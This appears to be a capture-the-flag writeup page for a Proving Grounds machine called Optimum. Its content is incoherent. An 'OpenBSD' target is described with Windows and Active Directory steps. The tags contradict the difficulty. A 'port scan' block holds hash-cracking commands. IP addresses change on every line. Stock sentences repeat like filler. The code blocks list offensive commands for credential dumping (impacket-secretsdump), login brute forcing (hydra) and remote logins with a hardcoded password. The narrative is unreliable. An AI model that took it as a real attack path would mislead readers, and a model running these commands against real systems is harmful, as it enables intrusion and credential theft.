---
TitleSEO: "OffSec Proving Grounds — Optimum (Hard OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Optimum (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Optimum. LAPS Abuse and SSTI to achieve hard compromise on OpenBSD."
Keywords: "easy, forensics, reversing"
URL: "https://zurefx.github.io/writeups/htb-optimum-820.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-optimum-820/"
Date: "2024-10-28"
Tags: "Easy, Forensics, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-optimum-820"
Permalink: "/writeups/htb-optimum-820.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Optimum** is rated **Hard** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.83.74.59`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.121.105.143
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.49.217.240/FUZZ
```

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.11.210/FUZZ
evil-winrm -i 10.101.74.181 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.84.128.54
```

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

Key finding: **LAPS Abuse**.

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.103.205 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.101.52.198
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.100.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p3306,993,1521 10.117.65.231 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.214.195
impacket-secretsdump administrator:'P@ssw0rd!'@10.105.218.228
crackmapexec smb 10.44.223.16 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.4.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `dcomexec`
- `pwncat`
- `socat`
- `bloodhound`

### Key Takeaways

- LAPS Abuse
- SSTI
- Cron Job
